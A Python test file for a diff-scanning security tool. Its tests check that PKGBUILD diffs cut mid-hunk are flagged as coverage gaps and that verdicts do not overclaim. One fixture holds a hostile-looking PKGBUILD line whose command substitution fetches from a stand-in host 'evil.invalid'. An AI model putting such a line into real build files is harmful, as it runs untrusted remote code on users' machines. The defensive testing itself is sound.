"""Regression tests for the Phase-2 coverage work on the typed core.

- ``partial_hunk``: a hunk carrying fewer lines than its header declares
  is a silent partial read.  The byte and line caps already fail closed
  with their own gaps; this covers the cut that reports nothing (a
  hand-sliced fixture, a stored blob capped upstream), which every array
  reader downstream used to treat as a whole array.
- Precise gap text: an unresolved-source gap quotes the first offending
  assignment instead of naming only the category.
"""

import pathlib

import pytest

from trustsight.analysis.pipeline import scan_diff
from trustsight.coverage import PARTIAL_HUNK, describe, gaps_from
from trustsight.diffdoc import parse_diff_lines
from trustsight.tokenizer import split_lines
from trustsight.verdict import fallback_verdict

_CORPUS = pathlib.Path(__file__).resolve().parents[1] / "fixtures" / "benign-corpus"


_CUT = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,6 +1,6 @@
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 depends=(
"""

_INTACT = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,3 +1,3 @@
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 pkgrel=1
"""


def _cuts(diff_text):
    return len(parse_diff_lines(split_lines(diff_text)).cut_hunks())


def test_a_cut_hunk_is_a_coverage_gap():
    assert _cuts(_CUT) == 1
    gaps = gaps_from(partial_hunks=_cuts(_CUT))
    assert gaps == [PARTIAL_HUNK]
    assert "cut mid-hunk" in describe(gaps)


def test_the_byte_and_line_caps_own_their_own_gap():
    # When a declared bound did the cutting, its gap already fails closed;
    # partial_hunk would only repeat it.
    assert gaps_from(diff_truncated=True, partial_hunks=1) == ["diff_truncated"]
    assert gaps_from(scan_truncated=True, partial_hunks=1) == ["scan_truncated"]


def test_an_intact_diff_has_no_partial_hunk():
    assert _cuts(_INTACT) == 0
    assert PARTIAL_HUNK not in gaps_from(partial_hunks=0)


def test_scan_diff_fails_closed_on_a_silently_cut_diff():
    fact = scan_diff(_CUT, package_name="demo")
    assert PARTIAL_HUNK in fact.coverage_gaps


def test_a_cut_hunk_gap_names_the_file_and_the_missing_count():
    fact = scan_diff(_CUT, package_name="demo")
    detail = describe(
        ["partial_hunk"], details={"partial_hunk": fact.partial_hunks}
    )
    assert "PKGBUILD" in detail
    # The header declares 6 new-side lines; 3 parsed before the cut.
    assert "declares 6" in detail and "3 parsed" in detail


def test_a_verdict_with_a_cut_hunk_never_claims_no_structural_changes():
    # §2: the summary cannot know what it did not see.  A fact with no
    # visible change facts is exactly the case that used to read "no
    # structural changes" while the diff had been cut.
    from trustsight.schema import PackageFact

    fact = PackageFact(package_name="demo", coverage_gaps=[PARTIAL_HUNK])
    verdict = fallback_verdict(fact)
    assert "no structural changes in the examined portion" in verdict
    assert "no structural changes." not in verdict


def _corpus_diff_with_a_multi_line_last_hunk():
    """The first corpus diff whose last hunk declares two or more lines."""
    for path in sorted(_CORPUS.glob("*.diff")):
        text = path.read_text(encoding="utf-8", errors="replace")
        doc = parse_diff_lines(split_lines(text))
        if not doc.files or not doc.files[-1].hunks:
            continue
        last = doc.files[-1].hunks[-1]
        if last.lines and (last.expected_lines or 0) >= 2:
            return text, last
    return None


def test_a_corpus_cut_loses_no_finding_silently():
    """A real diff cut mid-hunk: the gap fires and the visible findings
    are a subset of the intact run's, never a silent replacement."""
    found = _corpus_diff_with_a_multi_line_last_hunk()
    if found is None:
        pytest.skip("the locked corpus is not present in this checkout")
    text, last = found
    lines = split_lines(text)
    # Keep the last hunk's header plus its first content line only.
    cut_text = "\n".join(lines[: last.lines[0].index + 1])

    full = scan_diff(text, package_name="corpus-cut")
    cut = scan_diff(cut_text, package_name="corpus-cut")

    assert PARTIAL_HUNK in cut.coverage_gaps
    assert cut.partial_hunks
    assert f"declares {last.expected_lines}" in cut.partial_hunks[0]
    full_ids = {e.rule_id for e in full.score_breakdown}
    cut_ids = {e.rule_id for e in cut.score_breakdown}
    assert cut_ids <= full_ids


def test_an_unresolved_source_gap_quotes_the_offending_assignment():
    text = describe(
        ["unresolved_source"],
        details={"unresolved_source": ["source=($(curl https://evil.invalid/x))"]},
    )
    assert "source=($(curl https://evil.invalid/x))" in text


def test_gap_text_is_unchanged_without_details():
    assert describe(["unresolved_source"]) == describe(
        ["unresolved_source"], details={}
    )
